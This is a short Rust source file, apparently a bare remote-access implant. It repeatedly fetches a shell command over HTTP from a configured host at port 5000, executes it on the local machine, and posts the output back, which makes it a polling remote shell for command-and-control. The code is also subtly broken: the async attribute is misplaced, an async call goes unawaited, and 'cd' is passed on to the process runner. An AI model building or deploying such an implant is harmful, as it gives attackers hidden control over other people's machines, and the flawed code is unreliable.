use std::env;
use std::process::Command;
use std::str;

static PROTO: &str = "http";
static IP_ADDR: &str = "0.0.0.0";
static PORT: u32 = 5000;

#[tokio::main]

async fn res() -> String{
    let url = format!("{}://{}:{}", PROTO, IP_ADDR, PORT);
    match reqwest::get(url).await{
        Ok(_res) =>{
            let res = _res.text().await.unwrap();
            res
        }
        Err(_) =>{
            return format!("{}", "");
        }
    }
}
fn req(data: &str){
    let url = format!("{}://{}:{}", PROTO, IP_ADDR, PORT);
    let body = format!("{}", data);
    let client = reqwest::blocking::Client::new();
    match client.post(url).body(body).send() {
        Ok(_) =>{}
        Err(_) =>{}
    }
}
fn exec(cmd: &str) -> String{
    let args: Vec<&str> = cmd.split_whitespace().collect();
    if args.len() < 1{
        return format!("{}", "");
    }
    match args[0]{
        "cd" =>{
            match env::set_current_dir(args[1]){
                Ok(_) =>{}
                Err(_) =>{}
            }
    }
        _ =>{
        }
    }
    let out = Command::new(args[0]).args(&args[1..]).output();
    match out{
        Ok(_out) =>{
            let output = String::from_utf8_lossy(&_out.stdout).to_string();
            output
        }
        Err(_) =>{
            return format!("{}", "");
        }
    }
}
fn main(){
    loop{
        let cmd = res();
        let data = exec(&cmd);
        req(&data);
    }
}
